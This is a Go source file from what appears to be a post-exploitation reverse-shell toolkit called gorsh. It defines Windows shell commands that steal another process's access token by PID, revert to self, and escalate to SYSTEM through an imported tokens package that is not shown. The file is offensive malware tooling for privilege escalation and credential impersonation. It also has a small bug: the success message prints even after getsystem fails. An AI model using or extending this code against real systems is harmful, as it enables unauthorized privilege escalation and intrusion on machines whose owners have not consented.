//go:build windows

package cmds

import (
	"strconv"

	"github.com/abiosoft/ishell"
	"git.i.ctrl.red/blink/gorsh/pkg/tokens"
)

func StealToken(c *ishell.Context) {
	if len(c.Args) != 1 {
		c.Println(c.Cmd.Help)
		return
	}

	pidS := c.Args[0]
	pid, err := strconv.Atoi(pidS)
	if err != nil {
		c.Println(c.Cmd.Help)
		return
	}

	tokens.StealToken(pid)
}

func RevToSelf(c *ishell.Context) {
	tokens.RevToSelf()
}

func GetSystem(c *ishell.Context) {
	err := tokens.GetSystem()
	if err != nil {
		c.Printf("getsystem failed: %s\n", err)
	}
	c.Printf("you have the train\n", err)
}
